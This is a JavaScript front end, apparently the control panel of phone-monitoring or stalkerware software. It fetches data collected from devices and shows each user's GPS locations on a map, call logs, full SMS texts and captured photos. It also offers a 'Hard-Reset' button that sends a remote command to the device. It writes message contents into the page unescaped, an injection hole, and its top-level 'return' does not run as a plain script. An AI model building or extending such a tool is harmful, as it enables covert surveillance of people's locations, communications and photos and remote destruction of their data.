const API = window.location.origin + '/api';
const token = localStorage.getItem('token');
if (!token) return window.location.href = 'index.html';

const logoutBtn    = document.getElementById('logout');
const refreshBtn   = document.getElementById('refresh');
const hardResetBtn = document.getElementById('hardReset');

logoutBtn.onclick = () => {
  localStorage.removeItem('token');
  window.location.href = 'index.html';
};

refreshBtn.onclick = loadData;

hardResetBtn.onclick = async () => {
  const user = JSON.parse(atob(token.split('.')[1])).username;
  try {
    const res = await fetch(`${API}/command/${encodeURIComponent(user)}`, {
      method: 'POST',
      headers: { Authorization: 'Bearer ' + token }
    });
    const json = await res.json();
    alert('Hard-Reset enviado: ' + JSON.stringify(json));
  } catch (e) {
    alert('Erro no hard-reset: ' + e.message);
  }
};

let map, markers = [];

async function loadData() {
  try {
    const res = await fetch(`${API}/data`, {
      headers: { Authorization: 'Bearer ' + token }
    });
    if (!res.ok) throw new Error(`HTTP ${res.status}`);
    const pts = await res.json();

    // limpa marcadores antigos
    markers.forEach(m => map.removeLayer(m));
    markers = [];

    if (pts.length === 0) {
      alert('Nenhum dado coletado ainda.');
      return;
    }

    // centraliza no primeiro ponto
    const first = pts[0].location;
    map.setView([first.lat, first.lng], 13);

    // limpa tabelas e fotos
    document.querySelector('#callsTable tbody').innerHTML = '';
    document.querySelector('#smsTable tbody').innerHTML   = '';
    document.getElementById('photos').innerHTML           = '';

    pts.forEach(entry => {
      // popup no mapa
      const { lat, lng, time } = entry.location;
      const popupContent = `
        <b>${entry.username}</b><br>
        Lat: ${lat.toFixed(5)}, Lng: ${lng.toFixed(5)}<br>
        Hora: ${new Date(time).toLocaleString()}
      `;
      const marker = L.marker([lat, lng]).addTo(map)
        .bindPopup(popupContent);
      markers.push(marker);

      // chamadas
      entry.calls.forEach(call => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${call.number}</td>
          <td>${call.type}</td>
          <td>${call.duration}</td>
          <td>${new Date(call.date).toLocaleString()}</td>
        `;
        document.querySelector('#callsTable tbody').appendChild(tr);
      });

      // sms
      entry.sms.forEach(sms => {
        const tr = document.createElement('tr');
        tr.innerHTML = `
          <td>${sms.from}</td>
          <td>${sms.body}</td>
          <td>${new Date(sms.date).toLocaleString()}</td>
        `;
        document.querySelector('#smsTable tbody').appendChild(tr);
      });

      // fotos (base64)
      if (entry.photo) {
        const img = document.createElement('img');
        img.src = 'data:image/jpeg;base64,' + entry.photo;
        document.getElementById('photos').appendChild(img);
      }
    });
  } catch (e) {
    alert('Erro ao carregar dados: ' + e.message);
    console.error(e);
  }
}

// inicializa o mapa
map = L.map('map').setView([0, 0], 2);
L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
  attribution: '© OpenStreetMap'
}).addTo(map);

// carrega dados inicialmente
loadData();
